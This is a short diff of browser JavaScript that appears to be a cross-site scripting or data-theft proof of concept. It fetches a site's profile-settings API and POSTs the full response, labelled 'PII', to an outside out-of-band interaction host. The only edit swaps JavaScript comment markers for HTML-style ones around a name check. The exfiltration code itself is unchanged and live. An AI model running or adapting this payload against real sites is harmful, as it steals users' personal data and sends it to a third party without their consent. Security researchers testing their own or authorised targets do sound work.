@@ -3,12 +3,12 @@ xhr.open("GET", "/api/applicationData/forProfileSettings", true);
 xhr.onload = function() {
   if (xhr.status === 200) {
     const response = JSON.parse(xhr.responseText);
-    //const firstName = response.generalInfo?.contactInfo?.name?.firstName;
-    //if (firstName && firstName.trim() !== "") {
+<!--     const firstName = response.generalInfo?.contactInfo?.name?.firstName; -->
+<!--     if (firstName && firstName.trim() !== "") { -->
     xxhr=new XMLHttpRequest();
     xxhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
     xxhr.send(`PII=${xhr.responseText}`);
-    //}
+<!--     } -->
   }
 };
 xhr.send();
